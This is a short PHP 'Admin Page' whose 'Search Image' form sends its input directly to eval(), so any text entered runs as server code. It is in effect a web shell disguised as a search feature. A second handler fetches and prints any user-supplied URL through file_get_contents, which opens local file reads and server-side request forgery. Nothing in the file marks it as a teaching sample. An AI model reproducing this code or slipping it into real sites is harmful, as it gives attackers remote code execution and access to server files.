<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if (isset($_GET['url'])) {
    $url = $_GET['url'];
    $content = file_get_contents($url);
    echo $content;
    exit;
}

if (isset($_GET['search'])) {
    $search = $_GET['search'];
    eval($search);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Page</title>
</head>
<body>
    <h1>Admin Page</h1>
    <form method="GET" action="">
        <input type="text" name="search" placeholder="Search Image">
        <button type="submit">Search</button>
    </form>
</body>
</html>
